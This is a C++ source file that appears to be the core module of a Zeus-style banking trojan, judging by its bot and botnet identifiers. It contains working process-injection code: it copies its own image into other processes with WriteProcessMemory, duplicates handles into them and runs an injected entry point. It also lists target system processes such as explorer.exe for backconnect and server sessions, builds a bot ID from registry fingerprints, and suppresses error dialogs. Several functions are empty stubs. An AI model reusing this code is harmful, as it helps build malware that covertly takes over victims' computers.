#include<WinSock2.h>
#include<WTypes.h>
#include<WinInet.h>
#include<ShlObj.h>
#include<Shlwapi.h>
#include"defines.h"
#include"defines.h"

#include"relocTable.h"

#include "debug.h"
#include "generateddata.h"
#include "core.h"
#include "osenv.h"
#include "mem.h"
#include "str.h"
#include "peimage.h"
#include "process.h"
#include "winsecurity.h"
#include "fs.h"
#include "wsocket.h"
//#include "mscab.h"
#include "sync.h"
//#include "disasm.h"
//#include "comlibrary.h"
//#include "xmlparser.h"
//#include "wahook.h"
#include "registry.h"
#include "winsecurity.h"
#include "WinAPITypes.h"



////////////////////////////////////////////////////////////////////////////////////////////////////
// Process list.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  WCHAR nameStr[128]; //The name of the process, can keep the mask if folder == CSIDL_DESKTOP.
  DWORD rights; //Rights CDPF_RIGHT_*.
  DWORD folder; //Folder of the process CSIDL_. If the folder == CSIDL_DESKTOP, folder can be any.
}
PROCESSRIGHTS;

//!!! CODE with CSIDL_DESKTOP not active!
const static PROCESSRIGHTS processRights[] =
{
  //Processes that are present throughout all of the user's session.
	{L"dwm.exe",      Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
  {L"taskhost.exe", Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
	{L"taskeng.exe",  Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
	{L"wscntfy.exe",  Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
  {L"ctfmon.exe",   Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
	{L"rdpclip.exe",  Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
	{L"explorer.exe", Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_WINDOWS},
};

////////////////////////////////////////////////////////////////////////////////////////////////////
// Debug.
////////////////////////////////////////////////////////////////////////////////////////////////////


/*
  Analog to CWA(kernel32, GetProcAddress).
*/
static void *__GetProcAddress(HMODULE module, LPSTR name)
{
#if defined _WIN64
  PIMAGE_NT_HEADERS64 ntHeaders  = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#else
  PIMAGE_NT_HEADERS32 ntHeaders  = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#endif
  PIMAGE_DATA_DIRECTORY impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  PIMAGE_EXPORT_DIRECTORY ied =  (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);

  for(DWORD i = 0; i < ied->NumberOfNames; i++)
  {
    LPDWORD curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
    if(curName && Str::_CompareA(name, (LPSTR)((LPBYTE)module + *curName), -1, -1) == 0)
    {
      LPWORD pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
      curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
      return ((LPBYTE)module + *curName);
    }
  }

  return NULL;
}

/*
  Copying the module data into another process.

  IN process  - process to modify.
  IN image    - the address of the module in the process.
  IN curVa    - current VA data to be copied.
  IN data     - data.
  IN dataSize - data size to copy.

  Return      - true - in case of success,
                false - in case of error.
*/
static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *data, DWORD dataSize)
{
	DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
	return (CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, data, dataSize, NULL) == FALSE) ? false : true;
}

/*
  Copy the handle to the module in another process.

  IN process - process to modify.
  IN image   - the address of the module in the process.
  IN curVa   - current VA data to be copied.
  IN handle  - handle to copy.

  Return     - true - in case of success,
               false - in case of error.
*/
static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE handle)
{
	HANDLE newHandle;
	DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));

	if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, handle, process, &newHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) != FALSE)
	{
		if(CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, &newHandle, sizeof(HANDLE), NULL) != FALSE)return true;
		CWA(kernel32, DuplicateHandle)(process, newHandle, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
	}
	return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Core.
////////////////////////////////////////////////////////////////////////////////////////////////////


/*
  Load modules and functions.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initLoadModules(DWORD flags)
{
  if((coreData.modules.kernel32 = Process::_getKernel32Handle()) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "_getKernel32Handle() failed.");
    return false;
  }
	if((flags & Core::INITF_INJECT_START) == 0)
	{
		if((coreData.modules.current = CWA(kernel32, GetModuleHandleW)(NULL)) == NULL)return false;
	}
	else
	{
		//coreData.modules.current - updated rodetelem.

		//Update imports.
		if(!PeImage::_loadImport(coreData.modules.current, __GetProcAddress(coreData.modules.kernel32, "LoadLibraryA"), __GetProcAddress(coreData.modules.kernel32, "GetProcAddress")))return false;
	}


  //Mapping ntdll.dll and the desired functions.
  {
    {
			if((coreData.modules.ntdll = CWA(kernel32, GetModuleHandleW)(L"ntdll.dll")) == NULL)return false;
    }

		coreData.ntdllApi.ntCreateThread            = (ntdllNtCreateThread)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateThread");
		coreData.ntdllApi.ntCreateUserProcess       = (ntdllNtCreateUserProcess)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateUserProcess");
		coreData.ntdllApi.ntQueryInformationProcess = (ntdllNtQueryInformationProcess)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtQueryInformationProcess");
		coreData.ntdllApi.rtlUserThreadStart        = (void *)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "RtlUserThreadStart");
#   if(0)
		coreData.ntdllApi.ntQueryDirectoryFile      = (ntdllNtQueryDirectoryFile)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtQueryDirectoryFile");
#   endif
#   if defined(HOOKER_LDRLOADDLL)
		coreData.ntdllApi.ldrLoadDll                = (ntdllLdrLoadDll)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "LdrLoadDll");
		coreData.ntdllApi.ldrGetDllHandle           = (ntdllLdrGetDllHandle)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "LdrGetDllHandle");
#   endif
#   if defined(HOOKER_NTCREATEFILE)
		coreData.ntdllApi.ntCreateFile              = (ntdllNtCreateFile)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateFile");
#   endif

		if((coreData.ntdllApi.ntCreateThread == NULL && coreData.ntdllApi.ntCreateUserProcess == NULL)
			|| coreData.ntdllApi.ntQueryInformationProcess == NULL
#        if(0)
			|| coreData.ntdllApi.ntQueryDirectoryFile == NULL
#        endif
#        if defined(HOOKER_LDRLOADDLL)
			|| coreData.ntdllApi.ldrLoadDll == NULL
			|| coreData.ntdllApi.ldrGetDllHandle == NULL
#        endif
#        if defined(HOOKER_NTCREATEFILE)
			|| coreData.ntdllApi.ntCreateFile == NULL
#        endif
			)
		{
			return false;
		}
	}

	return true;
}

/*
  Basic OS data.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initOsBasic(DWORD flags)
{
  //WOW64
# if !defined _WIN64
  if((flags & Core::INITF_INJECT_START) == 0 && Process::_isWow64(CURRENT_PROCESS))coreData.proccessFlags |= Core::CDPF_WOW64;
# endif
  
  //Obtain the descriptor for access.
  if((coreData.securityAttributes.buf = WinSecurity::_getFullAccessDescriptors(&coreData.securityAttributes.saAllowAll, &coreData.securityAttributes.sdAllowAll)) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "GetFullAccessDescriptors failed.");
    return false;
  }

  //OS GUID.
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    MalwareTools::_getOsGuid(&coreData.osGuid);
  }
  else
  {
    //Preserved when you copy a Module.
  }

  //Windows version.
  {
	OsEnv::OSINFO oi;
	OsEnv::_getVersionEx(&oi);

	coreData.winVersion = oi.version;
	switch(oi.architecture)
	{
		case PROCESSOR_ARCHITECTURE_IA64:
		case PROCESSOR_ARCHITECTURE_AMD64:
			coreData.is64bitOS=true;
			break;
		default:
			coreData.is64bitOS=false;
	}
    if(coreData.winVersion < OsEnv::VERSION_XP)
    {
      WDEBUG1(WDDT_ERROR, "Bad windows version %u.", coreData.winVersion);
      return false;
    }
  }
  
  //Retrieving IntegrityLevel.
  if((coreData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
  {
    if(coreData.winVersion < OsEnv::VERSION_VISTA)coreData.integrityLevel = Process::INTEGRITY_MEDIUM;
    else
    {
      WDEBUG0(WDDT_ERROR, "Unknown integrity level.");
      return false;
    }
  }
  if((flags & Core::INITF_INJECT_START) == 0 && coreData.integrityLevel < Process::INTEGRITY_MEDIUM)
  {
    WDEBUG0(WDDT_ERROR, "Bad integrity level for normal startup.");
    return false;
  }
  
  return true;
}

/*
  Creating objects.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initHandles(DWORD flags)
{
	//Global objects.
	if((flags & Core::INITF_INJECT_START) == 0)
	{
		coreData.globalHandles.stopEvent   = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, NULL);
		coreData.globalHandles.stopedEvent = CURRENT_PROCESS;

		if(coreData.globalHandles.stopEvent == NULL)
		{
			WDEBUG0(WDDT_ERROR, "Failed to create global handles.");
			return false;
		}
	}
	else
	{
		//Created rodielskim flow.
	}

	return true;
}

/*
  Current user's data.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initUserData(DWORD flags)
{
	if((coreData.currentUser.token = Process::_getUserByProcessHandle(CURRENT_PROCESS, &coreData.currentUser.sessionId)))
	{
		coreData.currentUser.sidLength = CWA(advapi32, GetLengthSid)(coreData.currentUser.token->User.Sid);
		coreData.currentUser.id        = Crypt::crc32Hash((LPBYTE)coreData.currentUser.token->User.Sid, coreData.currentUser.sidLength);
		WDEBUG2(WDDT_INFO, "coreData.currentUser.id=\"0x%08X\", coreData.currentUser.sessionId=\"%u\"", coreData.currentUser.id, coreData.currentUser.sessionId);
	}
	else 
	{
		WDEBUG0(WDDT_ERROR, "Process::_getProcessUserByHandle failed!");
		return false;
	}

	return true;
}
/*
  Getting the path.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initPaths(DWORD flags)
{
  WCHAR path[MAX_PATH];

  //Get home directory.
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, coreData.paths.home) != S_OK)
    {
      WDEBUG0(WDDT_ERROR, "Failed to get home path."); 
      return false;
    }
    CWA(shlwapi, PathRemoveBackslashW)(coreData.paths.home);
  }
  else
  {
    //Parent path.
  }

  //Current file.
  DWORD size = CWA(kernel32, GetModuleFileNameW)(NULL, path, MAX_PATH);
  if((coreData.paths.process = Str::_CopyExW(path, size)) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Not enough memory.");
    return false;
  }
  
  return true;
}

/*
  Retrieve base configuration data.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initBaseConfig(DWORD flags)
{
  
  return true;
}

/*
  Create objects names.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initObjects(DWORD flags)
{
  
  return true;
}

/*
  Retrieving the process rights CDPF_RIGHT_*.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initProcessRights(DWORD flags)
{
  if(flags & Core::INITF_INJECT_START)
  {
    if(coreData.integrityLevel > Process::INTEGRITY_LOW)
    {
      //LPWSTR fileName = NULL;
      WCHAR path[MAX_PATH];
      WCHAR *name;

      for(DWORD i = 0; i < sizeof(processRights) / sizeof(PROCESSRIGHTS); i++)
      {
        name=(WCHAR *)processRights[i].nameStr;
#       if(0)
        if(processRights[i].folder == CSIDL_DESKTOP)
        {
          if(fileName == NULL)fileName = CWA(shlwapi, PathFindFileNameW)(coreData.paths.process);
          if(CWA(shlwapi, PathMatchSpecW)(fileName, name) == TRUE)
          {
            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
            coreData.proccessFlags |= processRights[i].rights;
            break;
          }
        }
        else
#       endif
        {
          if(CWA(shell32, SHGetFolderPathW)(NULL, processRights[i].folder, NULL, SHGFP_TYPE_CURRENT, path) == S_OK &&
            Fs::_pathCombine(path, path, name) &&
            CWA(kernel32, lstrcmpiW)(path, coreData.paths.process) == 0)
          {
            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
            coreData.proccessFlags |= processRights[i].rights;
            break;
          }
        }
      }
    }
  }
#if !defined _WIN64
  else if(coreData.proccessFlags & Core::CDPF_WOW64)coreData.proccessFlags |= Core::CDPF_RIGHT_ALL;
#endif

  return true;
}

/*
  Setting the hook.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initHooks(DWORD flags)
{
  
  return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

bool Core::init(DWORD flags)
{
  if((flags & INITF_INJECT_START) == 0)coreData.proccessFlags = 0;
  //else coreData.proccessFlags = 0; //updated parent.

  //obtain the handles of the main modules (dll).
  if(!initLoadModules(flags))return false;

  //init basic process information (after CryptedDLL has been initialized)
  Process::init();

  //Initialize the basic modules.
  Mem::init(512 * 1024);
  Crypt::init();
  
  //Preparing to output debugging information.
# if(BO_DEBUG > 0)
  {
    DebugClient::Init();
#   if(BO_DEBUG == 1)  
    CWA(user32, MessageBeep)(-1);
#   elif(BO_DEBUG == 2)
    debugServer = NULL;  
    if((flags & INITF_INJECT_START) == 0)
    {
      //LOAD_LIBRARY_FUNCTION(dllFn_CreateThread,kernel32_CreateThread); // Load DLL library function
      //debugServer = (dllFn_CreateThread)(NULL, 0, debugServerProc, NULL, 0, NULL);
			debugServer = CWA(kernel32, CreateThread)(NULL, 0, debugServerProc, NULL, 0, NULL); 
    }
#   endif
  }
# endif


  //Basic OS data.
  if(!initOsBasic(flags))return false;

  //Objects.
  if(!initHandles(flags))return false;

  //Current user's data.
  if(!initUserData(flags))return false;

  //retrieve home directory.
  if(!initPaths(flags))return false;
  
  //PID
  coreData.pid = CWA(kernel32,GetCurrentProcessId)();

  //Nulling UserAgent.
  coreData.httpUserAgent = NULL;
  
  if(!initBaseConfig(flags))return false;
  
  //Creation of object names.
  if(!initObjects(flags))return false;

  //Set the process rights.
  if(!initProcessRights(flags))return false;

  //Initialize additional modules.

  //Print the information about the process.
# if(BO_DEBUG > 0)
  {
    LPWSTR userSid;
		//if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
		userSid = NULL;
    BASECONFIG baseConfig;
    getBaseConfig(&baseConfig);

    WDEBUG11(WDDT_INFO, "Initialized successfully:\r\nVersion: %u.%u.%u.%u\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\nbaseConfig hash=0x%08X",
                       VERSION_MAJOR(BO_CLIENT_VERSION),
                       VERSION_MINOR(BO_CLIENT_VERSION),
                       VERSION_SUBMINOR(BO_CLIENT_VERSION),
                       VERSION_BUILD(BO_CLIENT_VERSION),
                       coreData.integrityLevel,
                       coreData.proccessFlags,
                       coreData.paths.process,
                       CWA(kernel32, GetCommandLineW)(),
                       coreData.paths.home,
                       userSid == NULL ? L"-" : userSid,
                       Crypt::crc32Hash((LPBYTE)&baseConfig, sizeof(BASECONFIG)));

    if(userSid != NULL)CWA(kernel32, LocalFree)(userSid);
  }
# endif
  
  return true;
}

void Core::uninit(void)
{
}

void Core::initHttpUserAgent(void)
{
  
}

void Core::initDefaultCallUrlData(Wininet::CALLURLDATA *cud)
{
  
}

HANDLE Core::createMutexOfProcess(DWORD pid)
{
  WCHAR objectName[50];
  BASECONFIG baseConfig;
  PESETTINGS pes;

  getBaseConfig(&baseConfig);
  getPeSettings(&pes);

  MalwareTools::_generateKernelObjectName(&coreData.osGuid, pes.processInfecionId, pid, objectName, &baseConfig.baseKey, MalwareTools::KON_GLOBAL);
  return Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, objectName);
}

void Core::generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace)
{
  BASECONFIG baseConfig;
  getBaseConfig(&baseConfig);
  MalwareTools::_generateKernelObjectName(&coreData.osGuid, id, coreData.currentUser.id, buffer, &baseConfig.baseKey, objectNamespace);
}

HANDLE Core::waitForMutexOfObject(DWORD id, BYTE objectNamespace)
{
  WCHAR strObject[50];
  Core::generateObjectName(id, strObject, objectNamespace);
  return  Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, strObject);
}

void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags)
{
	IMAGE_DATA_DIRECTORY relocsDir;
	relocsDir.VirtualAddress=0xFFFFFFFF;
	relocsDir.Size=0x0c00;

	void *image = PeImage::_copyModuleToProcess(process, coreData.modules.current);

  if(image == NULL)
  {	  
		WDEBUG0(WDDT_ERROR, "Failed _copyModuleToProcess.");
	  return NULL;
  }
	WDEBUG0(WDDT_INFO, "OK: _copyModuleToProcess.");

  BYTE errorsCount = 0;
  
  //Duplicate the mutex of the new process into the new process.
  {
    HANDLE newMutex;
    if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, processMutex, process, &newMutex, 0, FALSE, DUPLICATE_SAME_ACCESS) == FALSE)
    {
      WDEBUG0(WDDT_ERROR, "Failed to duplicate mutex of process.");
      errorsCount++;
    }
		else
		{
			WDEBUG0(WDDT_INFO, "OK: DuplicateHandle.");
		}
  }
  
  //coreData.proccessFlags.
  proccessFlags |= (coreData.proccessFlags & CDPT_INHERITABLE_MASK);
  if(!copyDataToProcess(process, image, &coreData.proccessFlags, &proccessFlags, sizeof(DWORD)))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.proccessFlags.");
    errorsCount++;
  }
	else
	{
		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.proccessFlags.");
	}

  //Specify the current module.
  if(!copyDataToProcess(process, image, &coreData.modules.current, &image, sizeof(HMODULE)))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.modules.current.");
    errorsCount++;
  }
	{
		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.modules.current.");
	}

  //coreData.globalHandles.stopEvent.
  if(!copyHandleToProcess(process, image, &coreData.globalHandles.stopEvent, coreData.globalHandles.stopEvent))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopEvent.");
    errorsCount++;
  }
	{
		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.globalHandles.stopEvent.");
	}

  //coreData.globalHandles.stopedEvent.
  if(!copyHandleToProcess(process, image, &coreData.globalHandles.stopedEvent, coreData.globalHandles.stopedEvent))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopedEvent.");
    errorsCount++;
  }
	{
		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.globalHandles.stopedEvent.");
	}

  //Error outputs.
  if(errorsCount != 0)
  {
		CWA(kernel32, VirtualFreeEx)(process, image, 0, MEM_RELEASE);
    return NULL;
  }
  
  //successful entry.
  return image;
}

DWORD Core::disableErrorMessages(void)
{
#if(BO_DEBUG == 0)
  return CWA(kernel32, SetErrorMode)(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
#else
  return 0;
#endif
}

void Core::replaceFunction(const void *oldFunction, const void *newFunction)
{
  void **list = (void **)&coreData.ntdllApi;
  for(DWORD i = 0; i < sizeof(coreData.ntdllApi) / sizeof(void *); i++)if(list[i] == (void *)oldFunction)list[i] = (void *)newFunction;
}

bool Core::isActive(void)
{
  return CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 0) == WAIT_OBJECT_0 ? false : true;
}


void Core::_generateBotId(LPWSTR buf)
{
	WCHAR cid[40];
	DWORD subId[2];

	//Obtain NetBIOS.
	int size = sizeof(cid) / sizeof(WCHAR);
	if(CWA(kernel32, GetComputerNameW)(cid, (LPDWORD)&size) == FALSE)
		Str::_CopyW(cid, L"N/A", -1);

	//Obtain version. Here, a strong paranoia about the Mem:: _zero ().
	OSVERSIONINFOEXW ovi;
	Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	if(CWA(kernel32, GetVersionExW)((OSVERSIONINFOW *)&ovi) == FALSE)Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
	else Mem::_zero(ovi.szCSDVersion, sizeof(ovi.szCSDVersion));

	{
		WCHAR regKey[]=L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";

		//Date of installation.
		{
			WCHAR regValue1[]=L"InstallDate";
			subId[0] = Registry::_getValueAsDword(HKEY_LOCAL_MACHINE, regKey, regValue1);
		}

		//Registration data.
		{
			WCHAR regValue2[]=L"DigitalProductId";
			subId[1] = Registry::_getsCrc32OfValue(HKEY_LOCAL_MACHINE, regKey, regValue2);
		}
	}

	//Create a full ID
	{
		WCHAR format[]=L"%s_%08X%08X";
		size = Str::_sprintfW(buf, 60, format, cid, Crypt::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Crypt::crc32Hash((LPBYTE)subId, sizeof(subId)));
	}

	if(size < 1)Str::_CopyW(buf, L"fatal_error", -1);
}

void Core::getBaseConfig(BASECONFIG *bc)
{
}

void Core::getPeSettings(PESETTINGS *ps)
{
}

void Core::getPeSettingsPath(DWORD type, LPWSTR path)
{
}

void Core::getRegistryValue(DWORD type, LPWSTR key, LPWSTR value)
{
}

void Core::getCurrentBotnetName(LPWSTR name)
{
}

void *Core::getBaseOverlay(const void *mem, LPDWORD size)
{  
  
  return NULL;
}

bool Core::setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize)
{
	return true;
}

void Core::createServices(bool waitStop)
{
  
}

static void destoyUserNow(void)
{
  CWA(user32, ExitWindowsEx)(EWX_LOGOFF | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
}

bool Core::destroyUser(void)
{
  //FIXME: To read, to think.
  
  return false;
}

bool Core::showInfoBox(BYTE type)
{
  return true;
}

#define BO_DEBUG 1

////////////////////////////////////////////////////////////////////////////////////////////////////
// entry point.
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(BO_DEBUG == 1)
static SECURITY_ATTRIBUTES saFullAccess;
static SECURITY_DESCRIPTOR sdFullAccess;
static bool SecurityOK;
static WCHAR __strDebugReportFile[MAX_PATH];
static DWORD integrityLevel;
#define LOG_FILE_W        L"working.txt"
#define MUTEX_WRITEFILE L"{7EEEA37C-5CEF-11DD-9810-2A4256D89593}"
#endif

static bool defaultModuleEntry(void)
{
	SecurityOK = WinSecurity::_getFullAccessDescriptors(&saFullAccess, &sdFullAccess);

	integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS);
	if(integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH)
	{
		Str::_CopyW(__strDebugReportFile, L"C:\\running-hidden.txt", -1);
	}
	else
	{
		__strDebugReportFile[0] = 0;
		CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, __strDebugReportFile);
		Fs::_pathCombine(__strDebugReportFile, __strDebugReportFile, LOG_FILE_W);
	}

	HANDLE hMutex = Sync::_waitForMutex(SecurityOK ? &saFullAccess : NULL, MUTEX_WRITEFILE);
	if(hMutex)
	{
		WinSecurity::_setLowIntegrityLevelLabel(__strDebugReportFile, SE_FILE_OBJECT, false);
		HANDLE file = CWA(kernel32, CreateFileW)(__strDebugReportFile, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		//alternative path
		WCHAR path[MAX_PATH];
		if(file == INVALID_HANDLE_VALUE && (integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH))
		{
			path[0] = 0;
			CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, path);
			Fs::_pathCombine(path, path, LOG_FILE_W);
			WinSecurity::_setLowIntegrityLevelLabel(path, SE_FILE_OBJECT, false);
			file = CWA(kernel32, CreateFileW)(path, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		}

		Str::UTF8STRING u8str;
		DWORD dwSize;
#define ERROR_STR "Usao sam ovde!!!"

		CHAR ptr[MAX_PATH];
		Str::_sprintfA(ptr, MAX_PATH, "advapi32(EqualSid):0x%08x", (LPBYTE)(CWA(advapi32, EqualSid)));

		u8str.data   = (void *)ptr;
		u8str.length = Str::_LengthA(ptr);
		u8str.size   = Str::_LengthA(ptr);

		//Write BOM
		if(file != INVALID_HANDLE_VALUE)
		{
			LARGE_INTEGER li;
			if(CWA(kernel32, GetFileSizeEx)(file, &li) && li.HighPart == 0 && li.LowPart == 0)
			{
				DWORD dws = UTF8_BOM;
				CWA(kernel32, WriteFile)(file, &dws, UTF8_BOM_SIZE, &li.LowPart, NULL);
			}
			if(CWA(kernel32, SetFilePointer)(file, 0, NULL, FILE_END) != INVALID_SET_FILE_POINTER)
			{
				CWA(kernel32, WriteFile)(file, u8str.data, u8str.size, &dwSize, 0);
				CWA(kernel32, WriteFile)(file, "\r\n\r\n", 4, &dwSize, 0);
			}
			CWA(kernel32, CloseHandle)(file);
		}

		Sync::_freeMutex(hMutex);
	}

	return true;
}

int WINAPI Core::_injectEntryForModuleEntry(void)
{
  if(defaultModuleEntry())
  {
    //Calculate the entry point. Deliberately do not check the readability indexes.
		HANDLE mainModule = CWA(kernel32, GetModuleHandleW)(NULL);
    if(((PIMAGE_DOS_HEADER)mainModule)->e_magic == IMAGE_DOS_SIGNATURE)
    {
      PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)mainModule + ((PIMAGE_DOS_HEADER)mainModule)->e_lfanew);
      if(ntHeaders->Signature == IMAGE_NT_SIGNATURE)
      {
        LPBYTE entry = ntHeaders->OptionalHeader.AddressOfEntryPoint + (LPBYTE)mainModule;
        return ((PROC)entry)();
      }
    }
    WDEBUG0(WDDT_ERROR, "Failed to get original entry point.");
  }

  return 0;
}

DWORD WINAPI Core::_injectEntryForThreadEntry(void *)
{
  defaultModuleEntry();
  return 0;
}

/*
  Launching process as bot, depending: in overlay mode, installer or boot mode.

  IN forceUpdate  - force an update regardless of the version (only for the installer).
  IN removeItself - auto remove after completion of the process (for the installer).

  Return          - true - in case of success,
                    false - in case of error.
*/
static bool runAsBot(bool forceUpdate, bool removeItself)
{

  return true;
}

